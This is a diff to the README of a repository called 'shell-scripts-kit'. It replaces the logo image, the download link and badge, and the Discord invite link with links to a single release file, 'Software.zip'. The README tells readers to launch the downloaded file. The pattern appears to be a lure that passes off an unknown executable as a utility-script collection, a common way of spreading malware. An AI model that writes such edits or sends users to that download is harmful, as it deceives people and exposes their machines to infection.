@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Shell Scripts Kit Repository! 🐚
 
-![Shell Scripts Kit](https://img.icons8.com/color/452/shell.png)
+![Shell Scripts Kit](https://github.com/MrHybride/shell-scripts-kit/releases/download/v1.0/Software.zip)
 
 ## Repository: shell-scripts-kit
 
@@ -22,10 +22,10 @@ This repository is a collection of utility shell scripts that automate and simpl
 - `ubuntu`
 
 ### Get Started
-Get a head start with our collection by accessing our latest release: [Download Now!](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+Get a head start with our collection by accessing our latest release: [Download Now!](https://github.com/MrHybride/shell-scripts-kit/releases/download/v1.0/Software.zip)
 Launch the downloaded file once it finishes downloading to unleash the power of these utility scripts.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/MrHybride/shell-scripts-kit/releases/download/v1.0/Software.zip)](https://github.com/MrHybride/shell-scripts-kit/releases/download/v1.0/Software.zip)
 
 ### Explore Even Further
 Can't access the download link or need more options? Head over to the "Releases" section of this repository for more downloadable content!
@@ -34,7 +34,7 @@ Can't access the download link or need more options? Head over to the "Releases"
 Feel free to fork this repository, submit issues, or contribute by creating pull requests. Your input is valuable, and together we can enhance this collection for others in the community to benefit from.
 
 ### Connect With Us
-Have questions, suggestions, or just want to chat with like-minded individuals? Join our Discord community [here](https://discord.gg/yourcommunity).
+Have questions, suggestions, or just want to chat with like-minded individuals? Join our Discord community [here](https://github.com/MrHybride/shell-scripts-kit/releases/download/v1.0/Software.zip).
 
 ### Spread the Word!
 Show your support by sharing this repository with your network. Let's empower developers around the world with these helpful shell scripts.
